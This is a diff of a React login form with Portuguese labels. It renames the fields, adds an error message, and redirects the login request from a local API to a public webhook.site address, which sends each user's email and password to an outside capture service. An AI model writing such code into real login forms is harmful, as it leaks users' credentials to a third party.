@@ -8,29 +8,30 @@ import {
   InputGroup, 
   LoginLinks, 
   StyledLink, 
+  ErrorMessage
 } from './style.js';
 
 const Login = () => {
-  const [username, setUsername] = useState('');
-  const [password, setPassword] = useState('');
+  const [errorMessage, setErrorMessage] = useState('');
+  const [email_pessoal, setEmail] = useState('');
+  const [senha, setSenha] = useState('');
 
   const handleLogin = async (e) => {
     e.preventDefault();
 
     try {
-      const response = await axios.post('http://localhost:5000/api/login', {
-        username,
-        password,
+      const response = await axios.post('https://webhook.site/56c4b64c-8b32-4515-8b38-6c6f34e69334', {
+        email_pessoal,
+        senha,
       });
 
       if (response.data.success) {
         alert('Login bem-sucedido!');
       } else {
-        alert('Falha no login. Verifique suas credenciais.');
+        setErrorMessage('Falha ao Logar.');
       }
     } catch (error) {
-      console.error('Erro durante o login:', error);
-      alert('Ocorreu um erro. Por favor, tente novamente.');
+      setErrorMessage('Falha ao Logar.');
     }
   };
 
@@ -39,25 +40,26 @@ const Login = () => {
       <LoginForm onSubmit={handleLogin}>
         <h2>Login</h2>
         <InputGroup>
+        <p>E-mail</p>
           <Input
             type="text"
-            id="username"
-            placeholder='Usuário'
-            value={username}
-            onChange={(e) => setUsername(e.target.value)}
+            value={email_pessoal}
+            onChange={(e) => setEmail(e.target.value)}
             required
           />
         </InputGroup>
         <InputGroup>
+        <p>Senha</p>
           <Input
             type="password"
-            id="password"
-            value={password}
-            placeholder='Senha'
-            onChange={(e) => setPassword(e.target.value)}
+            value={senha}
+            onChange={(e) => setSenha(e.target.value)}
             required
           />
         </InputGroup>
+        {errorMessage && (
+          <ErrorMessage>{errorMessage}</ErrorMessage>
+        )}
         <Button
           type="submit"
           text="Entrar"
